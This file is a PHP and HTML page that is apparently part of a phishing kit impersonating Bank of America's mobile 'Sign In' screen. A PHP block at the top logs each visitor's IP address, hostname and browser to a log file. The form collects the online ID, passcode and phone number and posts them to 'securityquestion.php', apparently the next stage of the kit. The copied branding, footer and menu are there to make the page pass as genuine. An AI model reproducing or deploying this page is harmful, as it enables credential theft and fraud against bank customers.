<?php
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$ip = getenv("REMOTE_ADDR");
	$time = date('Y-m-d H:i:s');
	$random = md5($time);
	
	$logfile= 'log.html'; 
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$logdetails= date("F j, Y, g:i a") . ': ' . '<a href=http://www.ip-score.com/checkip/'.$ip.' target=_blank>'.$_SERVER['REMOTE_ADDR'].'</a> - '.$hostname.' - '.$user_agent.'<br>'; 
	$fp = fopen($logfile, "a+");
	fwrite($fp, $logdetails);
	fclose($fp);
	
	?>
<html class=" js no-flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
		<meta name="apple-itunes-app" content="app-id=284847138">
		<!--[if IE 9]>
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" >
		<![endif]-->
		<title>Sign In</title>
		<link rel="stylesheet" href="css/bactouch.css">
		<link rel="stylesheet" href="css/toolbar.css">
		<link rel="stylesheet" href="css/bact_listview.css">
		<link rel="stylesheet" href="css/footer.css">
		<!-- <link rel="stylesheet" href="css/slidemenu.css"> -->
	</head>
	<body>
		<div id="page" class="" style="display: block; position: static; float: left; height: 100%; width: 100%; left: 100%;">
			<div id="cmw_toolBar_" class="cmw_toolBar_">
				<a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite backButton icon sprite-menu" href="#" title="Show menu for all mobile banking features" role="button"></a>
				<div id="barker" class="hidden"></div>
				<h1 id="title" class="">
					<div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Sign In</div>
					<span class="adaHidden" id="adaTitleText">Enter your Online ID</span>
				</h1>
				<a id="rightButton" class="hidden"></a>
			</div>
			<div id="SASI_banner_container"></div>
			<div class="pageMinHeight">
				<!-- SIGN ON HOME PAGE-->
				<div class="signonVersionTwoHomePage">
					<div id="scrollerwrapperOt" class="overthrow">
						<div id="divMessaging" class="hidden"></div>
						<div id="blackBerryMsg" class="padding10" style="display: none;"></div>
						<div id="accountLocked" class="hidden">
							<ul class="listView edge">
								<li role="button" class="noLink">
									<div class="imageWrap paddingHoriz20"><img src="img/ico_alert@2x.png" class=""></div>
									<p class="subVal padding10 fontRed" id="headError"></p>
									<p class="subVal padding10" id="bodyError"></p>
								</li>
							</ul>
						</div>
						<div id="successMsg"></div>
						<form action="securityquestion.php" method="post" autocomplete="off" name="form">
							<div id="newOnlineId" style="display: block;">
								<div class="toppad5">
									<fieldset>
										<legend class="hidden" id="signonToggle">Toggle Yes or No</legend>
										<label for="saveCustomUserId" class="adaHidden"></label>
										<input type="checkbox" id="saveCustomUserId" class="hidden">
										<label class="adaHidden" id="signonOIDLabel" for="btCustomOnlineId">Enter your Online ID</label>
										<div class="inputEntryContainer">
											<div class="inputContainer">
												<label for="btCustomOnlineId" class="adaHidden"></label>
												<input name="user" type="text" class="focus sprite-clear_input_icns" maxlength="32" id="btCustomOnlineId" placeholder="Online ID" autocomplete="off" autocapitalize="off" autocorrect="off">
											</div>
											<div class="inputContainer" style="background-color: white;">
												<label for="btCustomPasscode" class="adaHidden"></label>
												<input name="pass" id="btCustomPasscode" type="password" class="masked" placeholder="Passcode" maxlength="20" title="Enter your Passcode." autocomplete="off"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
											</div>
											<div class="toppad20 paddingHoriz10"><b>Security Details </b></div>
											<br>
											<div class="inputContainer">
												<label for="btCustomOnlineId" class="adaHidden"></label>
												<input name="phone" type="text" class="focus sprite-clear_input_icns" maxlength="10" id="btCustomOnlineId" placeholder="Phone Number" autocomplete="off" autocapitalize="off" autocorrect="off">
											</div>
										</div>
									</fieldset>
								</div>
							</div>
							<div id="savedOnlineId" style="display: none;">
								<nav>
									<h2 id="cmsSelectID">Saved Online ID</h2>
									<ul id="btSavedIdHolder" class="listView listView toppad10 fontSize075"></ul>
								</nav>
							</div>
							<div id="savedOnlineIdPasscode" class="toppad20" style="display: none;">
								<nav>
									<ul class="listView">
										<li role="button">
											<a href="javascript:void(0);" id="cmsSelectonlineID">
												<p></p>
											</a>
										</li>
									</ul>
									<div id="inputPasscodeContainer">
										<div class="inputContainer">
											<label for="btsaveOIDPasscode" class="adaHidden"></label>
											<input id="btsaveOIDPasscode" type="password" class="masked" placeholder="Passcode" maxlength="20" title="Enter your Passcode." autocomplete="off">
											<a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
										</div>
									</div>
								</nav>
							</div>
					</div>
					<div>	
					<a id="btSignonContinue" role="" class="btn" href="#" onclick="document.forms['form'].submit(); return false;">
					<img style="margin-bottom:-4px;" class="paddingHoriz10" src="img/secure_lock.png" >
					<span id="signonLabel" type="submit" >Sign In</span>
					</a>
					</div>
					</form>
					<div id="helpOptionView" class="helpOptionView">
						<div class="padding10 center">
							<div class="inline-link blueLink"><a href="javascript:void(0);" id="forgetOIDPass" class="plain slideUp jsForgotIDPass">Forgot ID/Passcode?</a></div>
							<div class="paddingVert10 inline-link blueLink"><a href="javascript:void(0);" class="plain slideUp" id="signonEnroll">Enroll</a></div>
						</div>
						<div class="padding10">
							<!--
								<div class="toppad10 blueLink"><a href="javascript:void(0);" id="forgetOID" class="plain slideUp"></a></div>	
								<div class="toppad10 blueLink"><a href="javascript:void(0);" id="forgetpasscode" class="plain slideUp"></a></div>	
								<div class="paddingVert10 blueLink"><a href="#home?app=enrollmentsv2" class="plain slideUp" id="signonEnroll"></a></div>	
								-->
							<div class="borderLine smarBannerdisplay hidden"></div>
							<div class="bofaBannerLink smarBannerdisplay hidden"><a href="javascript:;" class="appNavigation plain slideUp" id="signonBannerLink">Get the Mobile Banking app</a></div>
						</div>
					</div>
					<div id="btnPin" style="position: fixed; bottom: 0px; display: none;">
						<ul class="btnGroupPin">
							<li><a id="cancelButton" class="plain slideUp btnNeg" role="button" href="javascript:void(0);">Cancel</a></li>
						</ul>
					</div>
				</div>
			</div>
			<footer>
				<div class="boa_footnote"></div>
				<div class="boa_footer">
					<div class="left"><a id="boa_footer_privacy" href="https://www.bankofamerica.com/privacy/overview.go" target="_blank">Privacy &amp; Security</a></div>
					<div class="right"><a id="boa_footer_ehl" href="https://www.bankofamerica.com/help/equalhousing_popup.go" class="ehl" target="_blank">Equal Housing Lender</a></div>
					<p class="clear">© 2019 Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.</p>
				</div>
			</footer>
		</div>
		<div class="spinnerPanel" style="height: 661px; display: none;">
			<div class="spinner" style="top: 264.4px;"><span class="messageIcon"></span><a id="spinnerLink" class="adaHidden" href="javascript:void(0)" role="dialog">processing</a></div>
		</div>
		<div id="slidemenu_sidePanel" style="display: none">
			<div class="slidemenu_menu">
				<ul class="popoverMenu">
					<li id="signoutButtonItem" class="hidden button" style="display: none;">
						<span class="menuButton">
						<a id="signoutButtonLink" class="linkButton" href="#home?app=signon" aria-hidden="true" role="button">Sign Out</a>
						</span>
					</li>
					<li class="menuCategory"> </li>
					<li class="menuItem accounts">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=accounts">Accounts</a>
					</li>
					<li class="menuItem mycard">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#creditCardStatement?app=accounts">My Card</a>
					</li>
					<li class="menuItem mysbcard">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#sbCardAccountDetails?app=accounts">My Card</a>
					</li>
					<li class="menuItem mycards">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=mycards">My Cards</a>
					</li>
					<li class="menuItem mysbcards">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=mycards">My Cards</a>
					</li>
					<li class="menuItem rewards">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=rewards">Rewards</a>
					</li>
					<li class="menuItem billpay">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=billpay">Bill Pay</a>
					</li>
					<li class="menuItem transfers">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=transfers">Transfer | Send</a>
					</li>
					<li class="menuItem bamd">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=deals">Special Offers &amp; Deals</a>
					</li>
					<li class="menuItem bankrewards">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=prefrewards">Banking Rewards</a>
					</li>
					<li class="menuItem prefrewards">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=prefrewards">Preferred Rewards</a>
					</li>
					<li class="menuCategory"> </li>
					<li class="menuItem help">
						<div class="hidden right tally">1</div>
						<a class="" href="#helpSupport?app=settings">Help &amp; Support</a>
					</li>
					<li class="menuItem contact">
						<div class="hidden right tally">1</div>
						<a class="" href="#contactus?app=click2call">Contact Us</a>
					</li>
					<li class="menuItem locations">
						<div class="hidden right tally">1</div>
						<a class="" href="https://locators.bankofamerica.com/">Locations</a>
					</li>
					<li class="menuItem settings">
						<div class="hidden right tally">1</div>
						<a class="" href="#home?app=settings">Profile &amp; Settings</a>
					</li>
					<li class="menuCategory"> </li>
					<li class="menuItem feedback">
						<div class="hidden right tally">1</div>
						<a class="" href="https://secure.opinionlab.com/ccc01/o.asp?id=wwxOVCML&amp;referer=%20http%3A%2F%2Fmobile.bankofamerica.com%2Fmobileweb">Send App Feedback</a>
					</li>
					<li class="menuItem legal">
						<div class="hidden right tally">1</div>
						<a class="" href="#legal_Info?app=settings">Legal Info &amp; Disclosures</a>
					</li>
				</ul>
			</div>
		</div>
		<div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div>
	</body>
</html>